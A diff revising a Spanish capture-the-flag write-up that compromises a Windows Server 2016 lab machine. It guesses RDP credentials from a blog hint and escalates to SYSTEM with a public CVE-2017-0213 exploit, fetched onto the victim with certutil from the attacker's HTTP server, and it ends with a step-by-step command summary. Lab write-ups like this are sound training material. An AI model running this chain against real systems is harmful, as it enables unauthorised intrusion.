@@ -4,95 +4,123 @@
 
 ## Reconocimiento
 
-1. Empiezo con un escaneo hasta el puerto 10.000
-`nmap -sC -sV -O -p 1-10000 -T4 10.129.175.126 -Pn -A`
+Empiezo con un escaneo amplio, hasta el puerto `10000`, para ver qué expone la máquina:
 
-Descubro 2 puertos abiertos:
+```bash
+nmap -sC -sV -O -p 1-10000 -T4 -Pn -A IP
+```
 
-- 80/tcp - http IIS 10.0
-- 3389/tcp - ms-wbt-server Microsoft Terminal Services
+Descubro dos puertos abiertos:
 
-Y que la máquina es Windows Server 2016
+- `80/tcp` -> IIS `10.0`
+- `3389/tcp` -> MSRDP
+
+También veo que la máquina es un `Windows Server 2016`.
 
 ![nmap](images/nmap.png)
 
----
 ## Enumeración
 
-Accedo a la web y veo que es una página de inicio de IIS.
+Entro en la web y veo la página por defecto de IIS.
 
-Decido usar gobuster para enumerar directorios:
-`gobuster dir -u http://IP -w /usr/share/wordlists/dirb/common.txt`
+Decido usar `gobuster` para enumerar directorios:
 
-Pero no encuentro nada con la lista de "common.txt", así que pruebo con "directory-list-2.3-medium.txt"
+```bash
+gobuster dir -u http://IP -w /usr/share/wordlists/dirb/common.txt
+```
 
-En esta ocasion encuentra los directorios de:
+Con `common.txt` no encuentro nada relevante, así que pruebo con una lista más grande:
 
-- /retro
-- /Retro
+```bash
+gobuster dir -u http://IP -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
+```
+
+En esta ocasión aparecen:
+
+- `/retro`
+- `/Retro`
 
 ![gobuster](images/gobuster.png)
 
-
-Al entrar en la web "/retro" veo que es un blog que administra un tal "Wade" que es fan de Ready Player One. En uno de sus posts deja caer que todavía usa el nombre de su avatar cuando intenta iniciar sesión.
+Al entrar en `/retro`, veo un blog administrado por un tal `Wade`, muy centrado en *Ready Player One*. En uno de sus posts deja caer que todavía usa el nombre de su avatar cuando intenta iniciar sesión.
 
 ![Wade](images/wade.png)
 
-Buscando un poco la referencia a Wade en *Ready Player One*, encuentro que el protagonista es `Wade Owen Watts` y que su nombre en OASIS es `Parzival`.
-
+Buscando un poco esa referencia, encuentro que el protagonista es `Wade Owen Watts` y que su nombre en OASIS es `Parzival`.
 
 ## Explotación
 
-Abro `remmina` para conectarme por RDP a la máquina.
+Con esa pista, pruebo acceso por RDP.
 
-Las credenciales que funcionan son: `wade - parzival`
+Las credenciales que me funcionan son:
 
-Conseguimos acceso a la máquina.
+- Usuario: `wade`
+- Contraseña: `parzival`
+
+Con eso consigo entrar en la máquina.
 
 ![login](images/login.png)
 
+## Post-explotación
 
-## Post-Explotación
+Lo primero que hago es comprobar en qué contexto estoy:
 
-Compruebo que usuario soy y que permisos tengo:
-
-```bash
+```powershell
 whoami /priv
 whoami
 ```
 
 ![whoami](images/whoami.png)
 
-Veo que apenas tengo permisos, así que toca investigar la máquina y buscar una forma de escalado de privilegios.
+Veo que sigo teniendo pocos privilegios, así que toca investigar la máquina para encontrar una vía de escalada.
 
-Al entrar en google chrome desde el escritorio veo que hay un bookmark con un CVE.
+En Google Chrome veo un marcador que apunta a un CVE.
 
 ![bookmark](images/bookmark.png)
 
-Busco el CVE y veo que es una vulnerabilidad de escalado de privilegios mediante certificado.
+Busco esa vulnerabilidad y veo que se trata de una técnica de escalada relacionada con certificados.
 
 ![CVE](images/cve.png)
 
-Sigo investigando la máquina y encuentro en la papelera de reciclaje un archivo llamado "hhupd.exe" que es un programa que se ejecuta como administrador.
+Sigo revisando la máquina y encuentro en la papelera un archivo llamado `hhupd.exe`, que es un binario que se ejecuta como administrador.
 
 ![hhupd](images/hhupd.png)
 
-Tras restaurarlo de la papelera, lo ejecutamos, nos sale una ventana para ver el certificado del publisher, y desde ahí intentar abrir el enlace del publisher, pero parece que no funciona ya que no nos deja abrir el certificado del publisher con Internet.
+Lo restauro y lo ejecuto. Me aparece la ventana del certificado del publisher y desde ahí intento seguir la técnica del certificado, pero en este caso no me termina de funcionar.
 
 ![certificate](images/certificate.png)
-
 ![certificate2](images/certificate2.png)
-
 ![error-certificate](images/error-certificate.png)
 
 ## Escalada de privilegios
 
-Así que lo que se me ocurrió fue buscar algun xploit que pudiera servirme para escalar privilegios para Windows Server 2016 (10.0 Build 14393) y encuentro este: `https://github.com/SecWiki/windows-kernel-exploits/blob/master/CVE-2017-0213/CVE-2017-0213_x64.zip`
+Como esa vía no me resulta útil en esta máquina, busco una alternativa para `Windows Server 2016 (10.0 Build 14393)` y encuentro un exploit público para `CVE-2017-0213`:
 
-Me lo bajo, lo descomprimo y se lo paso por http a la maquina victima.
+```text
+https://github.com/SecWiki/windows-kernel-exploits/blob/master/CVE-2017-0213/CVE-2017-0213_x64.zip
+```
+
+Lo descargo, lo descomprimo y lo transfiero a la víctima por HTTP.
 
 ![tranfercve](images/tranfercve.png)
 
-Ejecutamos ese exploit en la maquina victima desde una cmd y nos abre una nueva shell con privilegios de SYSTEM.
+Después lo ejecuto en la máquina víctima desde una `cmd` y se me abre una nueva shell con privilegios de `SYSTEM`.
 
 ![root](images/root.png)
+
+## Resultado
+
+La entrada inicial aquí sale otra vez de una pista débil en el blog, pero la escalada no la resuelvo con el truco del certificado, sino con un exploit local para el kernel que encaja con la versión exacta del sistema.
+
+## Resumen de comandos directo a SYSTEM/root
+
+1. `nmap -sC -sV -O -p 1-10000 -T4 -Pn -A IP`
+2. `gobuster dir -u http://IP -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt`
+3. Identificar en `/retro` la pista `Wade -> Parzival`
+4. `xfreerdp /u:wade /p:parzival /v:IP`
+5. `whoami /priv`
+6. Buscar un exploit para `Windows Server 2016 Build 14393`, en este caso `CVE-2017-0213`
+7. En Kali: `python3 -m http.server 8000`
+8. `certutil -urlcache -f URL exploit.exe`
+9. `.\exploit.exe`
+10. `whoami`
